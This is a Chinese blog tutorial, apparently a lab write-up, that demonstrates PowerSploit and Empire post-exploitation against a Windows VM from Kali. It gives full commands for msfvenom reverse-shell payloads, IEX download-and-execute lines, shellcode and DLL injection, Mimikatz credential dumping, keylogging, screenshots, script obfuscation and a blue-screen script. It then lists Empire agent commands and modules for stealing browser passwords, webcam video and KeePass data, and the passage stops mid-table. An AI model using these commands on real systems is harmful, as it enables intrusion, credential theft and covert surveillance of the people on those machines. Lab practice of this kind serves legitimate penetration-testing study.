<h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2><blockquote>
<p>kali Linux 2020.02              ip：192.168.2.132</p>
<p>Windows10 x86                  ip：192.168.2.129</p>
</blockquote>
<p>注意：本人是使用VMware虚拟机做实验，两台虚拟机都在NAT网络模式下，确保都在同一网段下，互相能ping通，kali这里防火墙默认没有禁止ping，Windows10这里需要在防火墙下开放ping，同时提供以下支持：</p>
<blockquote>
<p>kali开启apache服务：sudo service apache2 start</p>
<p>将powersploit目录放到/var/www/html/中，确保Windows10能通过HTTP访问到</p>
</blockquote>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>powersploit按照功能分为多个模块，可以通过github上项目的目录结构得知其各模块的功能：</p>
<blockquote>
<p>AntivirusBypass：用于发现杀毒软件的查杀特征</p>
<p>CodeExecution：在目标主机上执行代码</p>
<p>Exfiltration：目标主机上的信息搜集</p>
<p>Mayhem：蓝屏等破坏性脚本</p>
<p>Persistence：持久化控制的后门脚本</p>
<p>Recon：以目标主机作为跳板进行内网信息侦察</p>
<p>ScriptModification：在目标主机上创建或者修改脚本</p>
</blockquote>
<p>powersploit本身就是一个powershell脚本集合，结合github上源代码和网上文档可以很快的上手，powersploit脚本众多，我只会尝试使用部分脚本。</p>
<h2 id="powersploit实验"><a href="#powersploit实验" class="headerlink" title="powersploit实验"></a>powersploit实验</h2><h3 id="Invoke-Shellcode"><a href="#Invoke-Shellcode" class="headerlink" title="Invoke-Shellcode"></a>Invoke-Shellcode</h3><p>Invoke-Shellcode是CodeExecution模块下的一个脚本，这个脚本可以将shellcode插入到指定的进程ID或者当前powershell进程中</p>
<ol>
<li><p>首先使用msfvenom生成powershell格式的shellcode木马：</p>
<blockquote>
<p>sudo msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.132 LPORT=4444 -f powershell -o /var/www/html/test</p>
</blockquote>
<p> <img src="https://s1.ax1x.com/2020/08/19/dlJJgI.png" alt="dlJJgI.png"></p>
</li>
<li><p>接着在msf里设置监听</p>
<p> <img src="https://s1.ax1x.com/2020/08/19/dlYuzn.png" alt="dlYuzn.png"></p>
</li>
<li><p>然后在目标机器powershell中输入以下命令下载Invoke-Shellcode脚本，以及msfvenom生成powershell格式的shellcode木马</p>
<p> <code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/CodeExecution/Invoke-Shellcode.ps1&quot;)</code></p>
<p> <code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/test&quot;)</code></p>
<p> <img src="https://s1.ax1x.com/2020/08/19/dlNKbV.png" alt="dlNKbV.png"></p>
</li>
<li><p>然后在powershell中输入以下命令生成一个新的记事本进程，并设置为隐藏，在输入Get-Process命令查看进程pid</p>
<p> <code>Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden</code></p>
<p> <img src="https://s1.ax1x.com/2020/08/19/dlaMhF.png" alt="dlaMhF.png"></p>
<p> 这里进程id为2924</p>
</li>
<li><p>接着输入以下命令，使用Invoke-Shellcode脚本进行进程注入，也可以不需要ProcessID，那么此时shellcode会注入到当前powershell进程中</p>
<p> <code>Invoke-Shellcode -ProcessID 2924 -Shellcode($buf) -Force</code></p>
<p> <img src="https://s1.ax1x.com/2020/08/19/dldy24.png" alt="dldy24.png"></p>
<p> 注意：这里的$buf变量就是msfvenom生成powershell格式的shellcode木马中的变量，用来保存shellcode</p>
<p> <img src="https://s1.ax1x.com/2020/08/19/dldzi8.png" alt="dldzi8.png"></p>
</li>
<li><p>此时回到msf监听界面发现已经反弹成功了</p>
<p> <img src="https://s1.ax1x.com/2020/08/19/dlwQy9.png" alt="dlwQy9.png"></p>
</li>
</ol>
<h3 id="Invoke-DllInjection"><a href="#Invoke-DllInjection" class="headerlink" title="Invoke-DllInjection"></a>Invoke-DllInjection</h3><p>Invoke-DllInjection也是CodeExecution模块下的一个脚本，这个脚本的作用就是将指定的dll注入到指定进程中。</p>
<ol>
<li><p>首先使用msfvenom生成一个dll木马</p>
<p> <code>sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.132 lport=4444 -f dll -o /var/www/html/hacker.dll</code></p>
<p> <img src="https://s1.ax1x.com/2020/08/20/d3YKsI.png" alt="d3YKsI.png"></p>
</li>
<li><p>接着在msf里设置监听</p>
<p> <img src="https://s1.ax1x.com/2020/08/19/dlcYxf.png" alt="dlcYxf.png"></p>
<p> 注意这里的payload是windows/meterpreter/reverse_tcp</p>
</li>
<li><p>在目标机上下载dll，以及在powershell中加载Invoke-DllInjection脚本</p>
<p> <code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/CodeExecution/Invoke-DllInjection.ps1&quot;)</code></p>
<p> 这里我通过http下载到hacker.dll然后将其放到c盘根目录中</p>
<p> 启动一个新的进程来进行dll注入</p>
<p> <code>Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden</code></p>
<p> 进程id为4688</p>
</li>
<li><p>然后使用以下命令进行dll注入，并且在msf中收到反弹shell</p>
<p> <code>Invoke-DllInjection -ProcessID 4688 -Dll c:\hacker.dll</code></p>
<p> <img src="https://s1.ax1x.com/2020/08/19/dlRYxx.png" alt="dlRYxx.png"></p>
<p> <img src="https://s1.ax1x.com/2020/08/19/dlR7zq.png" alt="dlR7zq.png"></p>
</li>
</ol>
<h3 id="Invoke-ReflectivePEInjection"><a href="#Invoke-ReflectivePEInjection" class="headerlink" title="Invoke-ReflectivePEInjection"></a>Invoke-ReflectivePEInjection</h3><p>Invoke-ReflectivePEInjection也是CodeExecution模块下的一个脚本，按照官方给的文档中说的，这个脚本有两个功能，一个是将Windows PE文件（DLL / EXE）反射性地加载到powershell进程中，另一个就是将DLL反射性地注入到远程进程中，引用官方文档中的话：</p>
<blockquote>
<p>（1）将DLL或EXE反射性地加载到Powershell进程的内存中。 因为DLL / EXE是反射性加载的，所以当使用工具列出正在运行的进程的DLL时，不会显示它。</p>
<p>​        通过提供本地Windows PE文件（DLL / EXE）加载到远程系统的内存中，可以在远程服务器上运行此工具， 这会将DLL / EXE加载并执行到内存中，而无需将任何文件写入磁盘。</p>
<p>（2）将DLL反射性地加载到远程进程的内存中。 如上所述，当使用工具列出正在运行的远程进程的DLL时，将不会显示正在反射加载的DLL。</p>
<p>  ​        这对于在会话中向系统进程中注入后门可能是最有用的。 目前，无法从DLL检索输出。 脚本不会等待DLL完成执行，也不会对远程进程中的内存进行任何清理。</p>
</blockquote>
<p>注意：反射DLL注入用于将DLL加载到进程中，而不必将其放置在主机的文件系统上</p>
<p>有些不太理解这个脚本的第二个功能，试着做下第一个功能，为了和Invoke-DllInjection区别开，这次使用msfvenom写一个exe文件，exe也是pe文件格式，把exe尝试反射加载到powershell进程中，用msf进行监听，最后取得meterpreter shell</p>
<ol>
<li><p>使用msfvenom写一个exe木马</p>
<p> <code>sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.132 lport=4444 -f exe -o /var/www/html/hacker_exe.exe</code></p>
<p> <img src="https://s1.ax1x.com/2020/08/19/d1YT5F.png" alt="d1YT5F.png"></p>
</li>
<li><p>在目标机上加载Invoke-ReflectivePEInjection脚本，并且在kali上设置msf监听</p>
<p> <code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1&quot;)</code></p>
<p> 这里我依旧将exe木马通过http协议下载到windows10上，并且将其放到c盘根目录上</p>
<p> 然后使用如下命令运行脚本</p>
<p> <code>$PEBytes=[IO.File]::ReadAllBytes(&#39;c:\hacker_exe.exe&#39;)</code></p>
<p> <code>Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR</code></p>
<p> <img src="https://s1.ax1x.com/2020/08/19/d1azyd.png" alt="d1azyd.png"></p>
</li>
<li><p>此时在kali就能看到返回过来的session</p>
<p> <img src="https://s1.ax1x.com/2020/08/19/d1dJl4.png" alt="d1dJl4.png"></p>
</li>
</ol>
<p>这个脚本感觉不太行，本来反射型dll注入的精髓在于能做到不再目标磁盘上留下文件，而这个脚本缺陷在于不能远程加载dll/exe，在网上查阅时候，发现有人写出了<a href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="noopener">修改版</a>，可以从服务器下载文件并注入的脚本，具体的使用在文档中含有。</p>
<h3 id="Invoke-Portscan"><a href="#Invoke-Portscan" class="headerlink" title="Invoke-Portscan"></a>Invoke-Portscan</h3><p>Invoke-Portscan是Recon模块下的一个脚本，主要用于端口扫描，使用起来也比较简单。</p>
<p>载入脚本：</p>
<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/Recon/Invoke-Portscan.ps1&quot;)</code></p>
<p>然后使用以下命令进行扫描：</p>
<p><code>Invoke-Portscan -Hosts 192.168.2.1 -Ports &quot;21,22,23,80,445&quot;</code></p>
<p><img src="https://s1.ax1x.com/2020/08/19/d1q55t.png" alt="d1q55t.png"></p>
<p>这里192.168.2.1是我的物理机，可以看到检测出来开放了445端口。这个脚本可以使用参数<code>-HostFile</code>来载入一个ip字典，这个脚本胜在快捷方便。</p>
<h3 id="Invoke-ReverseDnsLookup"><a href="#Invoke-ReverseDnsLookup" class="headerlink" title="Invoke-ReverseDnsLookup"></a>Invoke-ReverseDnsLookup</h3><p>Invoke-ReverseDnsLookup是Recon模块下的一个脚本，主要是在内网中反向DNS查询</p>
<p>载入脚本：</p>
<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/Recon/Invoke-ReverseDnsLookup.ps1&quot;)</code></p>
<p>然后使用以下命令进行查询：</p>
<p><code>Invoke-ReverseDnsLookup &quot;192.168.2.132,192.168.2.129,192.168.2.1&quot; | fl IP,HostName</code></p>
<p><img src="https://s1.ax1x.com/2020/08/19/d1jiM8.png" alt="d1jiM8.png"></p>
<p>这里我没有设置域环境，这个脚本在域环境内更好用，通过DC服务器的DNS服务查询域内主机名和对应IP，更加快速的理清楚域内结构。</p>
<h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>Mimikatz本身在内网渗透中作用很大，powersploit将其集成到Exfiltration模块下，Mimikatz用来抓取主机密码，注意的是这个脚本的运行需要管理员权限：</p>
<p>载入脚本：</p>
<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/Exfiltration/Invoke-Mimikatz.ps1&quot;)</code></p>
<p>然后使用以下命令进行抓取：</p>
<p><code>Invoke-Mimikatz -DumpCreds</code></p>
<p><img src="https://s1.ax1x.com/2020/08/19/d3ex8f.png" alt="d3ex8f.png"></p>
<h3 id="Get-Keystrokes"><a href="#Get-Keystrokes" class="headerlink" title="Get-Keystrokes"></a>Get-Keystrokes</h3><p>Get-Keystrokes是Exfiltration模块下用来进行键盘记录的脚本，功能极其强大</p>
<p>载入脚本：</p>
<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/Exfiltration/Get-Keystrokes.ps1&quot;)</code></p>
<p>运行：</p>
<p><code>Get-Keystrokes -LogPath C:\Users\BMooS\log.txt</code></p>
<p><img src="https://s1.ax1x.com/2020/08/19/d3uI2V.png" alt="d3uI2V.png"></p>
<p>打字输出的结果：</p>
<p><img src="https://s1.ax1x.com/2020/08/19/d3KKsS.png" alt="d3KKsS.png"></p>
<p>这里是使用的默认<code>-PollingInterval</code>和<code>-CollectionInterval</code>，所以记录时有重复，使用时可以自行调整。</p>
<h3 id="Get-TimedScreenshot"><a href="#Get-TimedScreenshot" class="headerlink" title="Get-TimedScreenshot"></a>Get-TimedScreenshot</h3><p>Get-TimedScreenshot是Exfiltration模块下用来进行屏幕记录的脚本</p>
<p>载入脚本：</p>
<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/Exfiltration/Get-TimedScreenshot.ps1&quot;)</code></p>
<p>运行：</p>
<p><code>Get-TimedScreenshot -Path C:\Users\BMooS\temp\ -Interval 5 -EndTime 1:02</code></p>
<p>注意这里Interval参数是记录的时间间隔，单位是秒，Path路径是一个存在的文件夹，记录的图片会保存在文件夹下</p>
<p><img src="https://s1.ax1x.com/2020/08/20/d3GTHK.png" alt="d3GTHK.png"></p>
<h3 id="Out-CompressedDll"><a href="#Out-CompressedDll" class="headerlink" title="Out-CompressedDll"></a>Out-CompressedDll</h3><p>Out-CompressedDll是ScriptModification模块下用来对dll文件进行压缩混淆的脚本，调用方式：</p>
<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/ScriptModification/Out-CompressedDll.ps1&quot;)</code></p>
<p>使用：</p>
<p><code>Out-CompressedDll -FilePath C:\hacker.dll</code></p>
<p>这个脚本的使用我搜了一晚上，搞不懂是最后如何使用，最后输出powershell代码，看到官方给的使用说是将其复制到ps1文件中，再加上<code>[Test]::DoStuff()</code>，注意的是这个只适用于MSIL-based dlls。（ 这个真搞不会。）</p>
<h3 id="Out-EncodedCommand"><a href="#Out-EncodedCommand" class="headerlink" title="Out-EncodedCommand"></a>Out-EncodedCommand</h3><p>Out-EncodedCommand是ScriptModification模块下用来对powershell脚本或者代码块进行编码的脚本</p>
<p>调用方式：</p>
<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/ScriptModification/Out-EncodedCommand.ps1&quot;)</code></p>
<p>运行：</p>
<ol>
<li><p>对powershell代码块进行编码，示例：</p>
<p> <code>Out-EncodedCommand -ScriptBlock {Write-Host &#39;hello, world!&#39;}</code></p>
<p> <img src="https://s1.ax1x.com/2020/08/20/d3NXIf.png" alt="d3NXIf.png"></p>
</li>
<li><p>对powershell脚本文件进行编码，示例：</p>
<p> <code>Out-EncodedCommand -Path C:\Users\BMooS\EvilPayload.ps1 -NonInteractive -NoProfile -WindowStyle Hidden -EncodedOutput</code></p>
<p> 我在<code>C:\Users\BMooS\EvilPayload.ps1</code>文件下写入<code>&quot;test&quot; &gt; 1.txt</code></p>
<p> <img src="https://s1.ax1x.com/2020/08/20/d3UViT.png" alt="d3UViT.png"></p>
<p> 运行后powershell消失，在<code>C:\Users\BMooS\</code>下生成有<code>1.txt</code>文件</p>
<p> <img src="https://s1.ax1x.com/2020/08/20/d3UMLR.png" alt="d3UMLR.png"></p>
</li>
</ol>
<h3 id="Out-EncryptedScript"><a href="#Out-EncryptedScript" class="headerlink" title="Out-EncryptedScript"></a>Out-EncryptedScript</h3><p>Out-EncryptedScript是ScriptModification模块下用来对Script文件或者text file进行加密的脚本，可以设置password和salt</p>
<p>调用方式：</p>
<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/ScriptModification/Out-EncryptedScript.ps1&quot;)</code></p>
<p>运行：</p>
<p>加密：</p>
<p><code>Out-EncryptedScript .\test.ps1 -Password 123456 -Salt bmoos -FilePath C:\Users\BMooS\encrypted.ps1</code></p>
<p><img src="https://s1.ax1x.com/2020/08/20/d3UOX9.png" alt="d3UOX9.png"></p>
<p><code>test.ps1</code>是我在<code>C:\Users\BMooS\</code>文件夹下写的一个powershell脚本，内容为<code>Write-Host &#39;hello, world!&#39;</code></p>
<p>解密：</p>
<p><img src="https://s1.ax1x.com/2020/08/20/d3aSk6.png" alt="d3aSk6.png"></p>
<h3 id="Set-CriticalProcess"><a href="#Set-CriticalProcess" class="headerlink" title="Set-CriticalProcess"></a>Set-CriticalProcess</h3><p>Set-CriticalProcess是Mayhem模块下的两大函数之一，其作用就是在退出powershell后让系统蓝屏，注意在使用该模块时候，需要将Mayhem文件夹移动到<code>C:\Windows\System32\WindowsPowerShell\v1.0\Modules</code>目录下，然后使用<code>Import-Module Mayhem</code>导入模块</p>
<p>运行：直接在powershell中输入<code>Set-CriticalProcess</code>（注意需要管理员权限）</p>
<p><img src="https://s1.ax1x.com/2020/08/20/d3aBjJ.png" alt="d3aBjJ.png"></p>
<p>然后在powershell中输入exit退出powershell程序，系统蓝屏：</p>
<p><img src="https://s1.ax1x.com/2020/08/20/d3aW9O.png" alt="d3aW9O.png"></p>
<h1 id="empire"><a href="#empire" class="headerlink" title="empire"></a>empire</h1><p>Empire 是一款类似 Metasploit 的 PowerShell 可视化后期渗透测试框架，建立在密码安全通信和灵活的架构上。Empire 实现了无需 powershell.exe 就可运行 PowerShell 代理的功能,可快速部署后期漏洞利用模块，从键盘记录器到 Mimikatz，并且能够适应通信躲避网络检测，所有的这些功能都封装在一个以实用性为重点的框架中。(抄的，目前理解程度没那么深)</p>
<p>原本的<a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">empire项目</a>已经<strong>This project is no longer supported</strong>，毕竟这个还是和powersploit一样在17-18年很火，不过幸运的是，empire项目被BC-security接手，并发布了<a href="https://github.com/BC-SECURITY/Empire" target="_blank" rel="noopener">empire3.0</a>，更好的可以移植到kali2020.02版上(原项目在最新kali上不支持了)，以下是关于empire3.0的更新内容：</p>
<blockquote>
<p>从过去的纯 Python 2.7 移植到 2.7/3.x 环境。鉴于 Python 2.7 即将于 2019 年底走到尽头，Debian 已经开始放弃对所有 Python 2.7 程序包的支持。Debian 停止支持已经影响到了 Kali 对多个工具的支持，其中就包括 Empire。移植 Python3.x 后，能够确保 Empire 在未来很长一段时间都能获得 Kali 的支持。</p>
<p>除了向 Python3 移植外，Empire3.0 还增加了大量新功能模块（其中有些模块已经出现在开发分支版本中）。</p>
<p>通过更新 Base Launcher 消除了原有的一些签名和导致被 Windows Defender 发现的 bug。</p>
<p>Mimikatz 是当下最流行的后渗透测试工具之一，能够从内存中提取哈希值、密码等信息。在 Empire3.0 中， Mimikatz 升级到 2.2.0 版本，使得攻击 Windows 10（尤其是1903）成为可能。另外一个重要的新功能是加入了数据保护 API (DPAPI) 支持 Powershell PSCredential 和 SecureString。最新版本的 Mimkatz 已经在 Github 上架（<a href="https://github.com/gentilkiwi/mimikatz）" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz）</a></p>
<p>JA3 是 TLS 握手的指纹机制，是识别恶意加密流量的推荐方案。Akamai 发布的威胁研究报告显示，如今超过 80% 的恶意流量都流经加密通道。因此，很多防御者也开始采用这种技术。</p>
</blockquote>
<p>(这就是大神的世界吗？真的好仰慕，想成为大神这样的人)</p>
<h2 id="环境设置-1"><a href="#环境设置-1" class="headerlink" title="环境设置"></a>环境设置</h2><blockquote>
<p>kali Linux 2020.02              ip：192.168.2.132 </p>
<p>Windows7 x64                  ip：192.168.2.130</p>
</blockquote>
<h2 id="empire实验"><a href="#empire实验" class="headerlink" title="empire实验"></a>empire实验</h2><p>在kali上安装empire</p>
<p><code>sudo apt install powershell-empire</code></p>
<p>（empire3.0在kali2020.02上预装了，不过名字是powershell-empire。。。。）</p>
<p><img src="https://s1.ax1x.com/2020/08/21/dN79Y9.png" alt="dN79Y9.png"></p>
<p>empire的使用和metasploit使用类似，都是先设置一个监听，接着生成一个木马，木马在目标主机上运行，监听也会连接上反弹回来的代理</p>
<h3 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h3><p>输入<code>uselistener</code>来设置采用什么方式，使用双击Tab键可以看到一共有7种模式，分别为：dbx、http、http_com、http_foreign、http_hop、http_mapi、meterpreter、onedrive、redirector</p>
<p><img src="https://s1.ax1x.com/2020/08/22/ddeyhF.png" alt="ddeyhF.png"></p>
<p>选择<code>http</code>模式,输入命令<code>uselistener http</code>然后输入<code>info</code>命令查看具体参数设置</p>
<p><img src="https://s1.ax1x.com/2020/08/22/ddeIAK.png" alt="ddeIAK.png"></p>
<p>用<code>set</code>命令设置相应参数，修改<code>Name</code>，<code>Host</code>(默认是本机)和<code>Port</code>，然后输入命令<code>execute</code>命令开始监听</p>
<p><img src="https://s1.ax1x.com/2020/08/22/ddmP3Q.png" alt="ddmP3Q.png"></p>
<p>输入<code>back</code>命令即可返回上一层的<code>listeners</code>界面，输入<code>listeners</code>命令可以列出当前激活的<code>listener</code></p>
<p><img src="https://s1.ax1x.com/2020/08/22/ddmcUf.png" alt="ddmcUf.png"></p>
<p>注意，如果开启多个监听，必须使用不同的名称，且使用不同的端口，如果要删除某个监听使用<code>kill</code>命令加上监听的<code>Name</code></p>
<h3 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h3><p>设置完监听后，接下来生成木马在目标机器上运行stager。输入<code>usestager</code>来采用什么模块，依旧是双击Tab键，</p>
<p><img src="https://s1.ax1x.com/2020/08/22/ddnPIK.png" alt="ddnPIK.png"></p>
<p><code>multi</code>为通用模块、<code>osx</code>是mac操作系统，下面介绍Windows下几个常用的模块（DLL也常用，但是需要其他来辅助DLL运行，可以使用powersploit中的Invoke-DllInjection模块）</p>
<h4 id="launcher-vbs"><a href="#launcher-vbs" class="headerlink" title="launcher_vbs"></a>launcher_vbs</h4><p>生成vbs木马要使用到<code>windows/launcher_vbs</code>模块，输入<code>usestager windows/launcher_vbs</code>，在输入<code>info</code>查看模块信息</p>
<p> <img src="https://s1.ax1x.com/2020/08/22/ddYWGR.png" alt="ddYWGR.png"></p>
<p>这里只需要设置好<code>Listener</code>即可，然后execute运行，生成vbs文件</p>
<p><img src="https://s1.ax1x.com/2020/08/22/ddt0FH.png" alt="ddt0FH.png"></p>
<p>最后输入<code>back</code>返回到<code>listeners</code>界面开始监听，在目标机器上运行vbs文件即可</p>
<p><img src="https://s1.ax1x.com/2020/08/22/ddN4HO.png" alt="ddN4HO.png"></p>
<p>输入<code>agents</code>查看会话列表，使用<code>rename</code>命令更改名称</p>
<p><img src="https://s1.ax1x.com/2020/08/22/ddUdGd.png" alt="ddUdGd.png"></p>
<p>其他的木马模块操作类似，这种玩多了就有点脚本小子的感觉，像玩游戏一样，具体操作还是得看实际情况，可以多摸索摸索</p>
<h4 id="launcher"><a href="#launcher" class="headerlink" title="launcher"></a>launcher</h4><p>如果想要简单的powershell代码或者python代码，在设置完监听模块后，在<code>listeners</code>界面输入：</p>
<p><code>launcher powershell test1</code> 生成powershell代码</p>
<p><img src="https://s1.ax1x.com/2020/08/22/ddJhDS.png" alt="ddJhDS.png"></p>
<p><code>launcher python test1</code> 生成python代码</p>
<p><img src="https://s1.ax1x.com/2020/08/22/ddJT4s.png" alt="ddJT4s.png"></p>
<p>生成的代码放到目标机命令行中运行即可</p>
<h3 id="连接使用"><a href="#连接使用" class="headerlink" title="连接使用"></a>连接使用</h3><p>当目标主机反弹shell成功后，可以使用<code>agents</code>命令列出当前所有的已连接主机，这里在username前带*意思是有管理员权限或者更高权限的主机（这里是因为我的win7虚拟机是使用管理员账户登陆的，所以直接就是管理员权限）</p>
<p><img src="https://s1.ax1x.com/2020/08/22/ddUdGd.png" alt="ddUdGd.png"></p>
<p>使用<code>interact &lt;name&gt;</code>进入主机，然后输入help命令即可以列出所有命令</p>
<p><img src="https://s1.ax1x.com/2020/08/22/dd2s9P.png" alt="dd2s9P.png"></p>
<p>这里根据help的提示也知道这些命令的使用，尝试使用<code>mimikatz</code>抓取密码（需要管理员权限）</p>
<p><img src="https://s1.ax1x.com/2020/08/22/ddhcPs.png" alt="ddhcPs.png"></p>
<p>可以使用<code>creds</code>来自动过滤整理出获得的用户密码</p>
<p><img src="https://s1.ax1x.com/2020/08/22/ddhTIJ.png" alt="ddhTIJ.png"></p>
<p>其他命令很简单也很实用，可以在实战中多多尝试</p>
<blockquote>
<p>agents            Jump to the agents menu.<br>back              Go back a menu.<br>bypassuac         Runs BypassUAC, spawning a new high-integrity agent for a listener. Ex. spawn <listener><br>clear             Clear out agent tasking.<br>creds             Display/return credentials from the database.<br>dirlist           Tasks an agent to store the contents of a directory in the database.<br>download          Task an agent to download a file into the C2.<br>exit              Task agent to exit.<br>help              Displays the help menu or syntax for particular commands.<br>info              Display information about this agent<br>injectshellcode   Inject listener shellcode into a remote process. Ex. injectshellcode <meter_listener> <pid><br>jobs              Return jobs or kill a running job.<br>kill              Task an agent to kill a particular process name or ID.<br>killdate          Get or set an agent’s killdate (01/01/2016).<br>list              Lists all active agents (or listeners).<br>listeners         Jump to the listeners menu.<br>lostlimit         Task an agent to change the limit on lost agent detection<br>main              Go back to the main menu.<br>mimikatz          Runs Invoke-Mimikatz on the client.<br>psinject          Inject a launcher into a remote process. Ex. psinject <listener> &lt;pid/process_name&gt;<br>pth               Executes PTH for a CredID through Mimikatz.<br>rename            Rename the agent.<br>resource          Read and execute a list of Empire commands from a file.<br>revtoself         Uses credentials/tokens to revert token privileges.<br>sc                Takes a screenshot, default is PNG. Giving a ratio means using JPEG. Ex. sc [1-100]<br>scriptcmd         Execute a function in the currently imported PowerShell script.<br>scriptimport      Imports a PowerShell script and keeps it in memory in the agent.<br>searchmodule      Search Empire module names/descriptions.<br>shell             Task an agent to use a shell command.<br>shinject          Inject non-meterpreter listener shellcode into a remote process. Ex. shinject <listener> <pid><br>sleep             Task an agent to ‘sleep interval [jitter]’<br>spawn             Spawns a new Empire agent for the given listener name. Ex. spawn <listener><br>steal_token       Uses credentials/tokens to impersonate a token for a given process ID.<br>sysinfo           Task an agent to get system information.<br>updatecomms       Dynamically update the agent comms to another listener<br>updateprofile     Update an agent connection profile.<br>upload            Task the C2 to upload a file into an agent.<br>usemodule         Use an Empire PowerShell module.<br>workinghours      Get or set an agent’s working hours (9:00-17:00)</p>
</blockquote>
<h3 id="模块使用"><a href="#模块使用" class="headerlink" title="模块使用"></a>模块使用</h3><p>empire最主要的功能在于模块上的使用，在不同模块中都集成了很多工具脚本，可以使用<code>searchmodule</code>命令来搜索模块</p>
<h4 id="code-execution代码执行"><a href="#code-execution代码执行" class="headerlink" title="code_execution代码执行"></a>code_execution代码执行</h4><p><img src="https://s1.ax1x.com/2020/08/23/dwdyYF.png" alt="dwdyYF.png"></p>
<table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>code_execution/invoke_dllinjection</td>
<td>使用PowerSploit的Invoke-DLLInjection将Dll注入您选择的进程ID。</td>
</tr>
<tr>
<td>code_execution/invoke_metasploitpayload</td>
<td>生成一个新的隐藏PowerShell窗口，该窗口下载并执行Metasploit Payload。这与Metasploit模块theexploit/multi/scripts/web_delivery互动</td>
</tr>
<tr>
<td>code_execution/invoke_ntsd</td>
<td>使用NT Symbolic Debugger执行Empire launcher代码</td>
</tr>
<tr>
<td>code_execution/invoke_reflectivepeinjection</td>
<td>使用PowerSploit的Invoke-ReflectivePEInjection进行反射PE注入，将DLL/EXE加载进PowerShell进程中，或者将DLL加载进远程进程中</td>
</tr>
<tr>
<td>code_execution/invoke_shellcode</td>
<td>使用PowerSploit的Invoke–Shellcode注入Shellcode</td>
</tr>
<tr>
<td>code_execution/invoke_shellcodemsil</td>
<td>执行shellcode</td>
</tr>
</tbody></table>
<h4 id="collection信息收集"><a href="#collection信息收集" class="headerlink" title="collection信息收集"></a>collection信息收集</h4><p><img src="https://s1.ax1x.com/2020/08/23/dwd2l9.png" alt="dwd2l9.png"></p>
<table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>collection/ChromeDump</td>
<td>收集chrome浏览器保存的密码和浏览历史记录</td>
</tr>
<tr>
<td>collection/FoxDump</td>
<td>收集Firefox浏览器保存的密码和浏览历史记录</td>
</tr>
<tr>
<td>collection/USBKeylogger*</td>
<td>利用ETW作为键盘记录</td>
</tr>
<tr>
<td>collection/WebcamRecorder</td>
<td>从摄像头捕获视频</td>
</tr>
<tr>
<td>collection/browser_data</td>
<td>搜索浏览器历史记录或书签</td>
</tr>
<tr>
<td>collection/clipboard_monitor</td>
<td>按指定的时间间隔监视剪贴板</td>
</tr>
<tr>
<td>collection/file_finder</td>
<td>查找域中的敏感文件</td>
</tr>
<tr>
<td>collection/find_interesting_file</td>
<td>查找域中的敏感文件</td>
</tr>
<tr>
<td>collection/get_indexed_item</td>
<td>获取Windows desktop search索引文件</td>
</tr>
<tr>
<td>collection/get_sql_column_sample_data</td>
<td>从目标SQL Server返回列信息。</td>
</tr>
<tr>
<td>collection/get_sql_query</td>
<td>在目标SQL服务器上执行查询</td>
</tr>
<tr>
<td>collection/inveigh</td>
<td>Windows PowerShell LLMNR/mDNS/NBNS中间人工具</td>
</tr>
<tr>
<td>collection/keylogger</td>
<td>键盘记录到keystrokes.txt文件中，文件位置/downloads/agentname/keystrokes.txt/agentname</td>
</tr>
<tr>
<td>collection/minidump</td>
<td>进程的全内存转储，PowerSploit的Out-Minidump.ps1</td>
</tr>
<tr>
<td>collection/netripper</td>
<td>将NetRipper注入目标进程，该进程使用API挂钩以拦截来自低特权用户的网络流量和与加密相关的功能，从而能够在加密之前/解密之后捕获纯文本流量和加密流量。</td>
</tr>
<tr>
<td>collection/ninjacopy*</td>
<td>通过读取原始卷并解析NTFS结构，从NTFS分区卷中复制文件。</td>
</tr>
<tr>
<td>collection/packet_capture*</td>
<td>使用netsh在主机上启动数据包捕获。</td>
</tr>
<tr>
<td>collection/prompt</td>
<td>提示当前用户在表单框中输入其凭据，然后返回结果。</td>
</tr>
<tr>
<td>collection/screenshot</td>
<td>屏幕截图</td>
</tr>
<tr>
<td>collection/vaults/add_keepass_config_trigger</td>
<td>寻找KeePass配置</td>
</tr>
<tr>
<td>collection/vaults/find_keepass_config</td>
<td>此模块查找并解析KeePass.config.xml (2.X)和KeePass.config.xml (1.X)文件。</td>
</tr>
<tr>
<td>collection/vaults/get_keepass_config_trigger</td>
<td>该模块从KeePass 2.X配置XML文件中提取触发器说明</td>
</tr>
<tr>
<td>collection/vaults/keethief</td>
